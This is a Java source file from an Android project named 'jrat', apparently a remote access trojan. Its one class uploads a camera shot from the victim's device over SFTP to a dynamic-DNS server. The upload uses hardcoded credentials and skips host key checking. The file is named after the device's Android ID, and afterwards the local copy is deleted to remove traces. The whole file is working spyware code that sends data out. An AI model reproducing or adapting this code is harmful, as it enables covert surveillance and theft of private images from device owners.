package com.julioxus.jrat;

import android.content.Context;
import android.os.AsyncTask;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.io.File;
import java.util.Properties;

/**
 * Created by julioxus on 13/03/16.
 */
public class SendCameraShotAsyncTask extends AsyncTask<Context, Void, String> {

    private Context context;
    private String android_id, fileName;

    public SendCameraShotAsyncTask(Context context, String android_id, String fileName ) {
        this.context = context;
        this.android_id = android_id;
        this.fileName = fileName;
    }

    @Override
    protected String doInBackground(Context...params) {

        // Connection variables
        JSch jsch;
        Channel channel;
        Session session = null;
        ChannelSftp c = null;

        String username = "jrat";
        String host = "servidorbicho.no-ip.org";
        String pass = "master2015";

        // Establish connection with the server
        try {
            jsch = new JSch();
            session = jsch.getSession(username, host, 22);
            session.setPassword(pass);

            // Avoid asking for key confirmation
            Properties prop = new Properties();
            prop.put("StrictHostKeyChecking", "no");
            session.setConfig(prop);

            session.connect();

            channel = session.openChannel("sftp");
            channel.connect();
            c = (ChannelSftp) channel;

        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            String fsrc = fileName;
            String fdest = android_id + "CameraShot.jpg";
            c.put(fsrc, fdest);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Close connection
        c.disconnect();
        session.disconnect();

        // Delete the file

        File file = new File(fileName);
        file.delete();
        System.out.println("CameraShot file deleted");


        return null;
    }
}
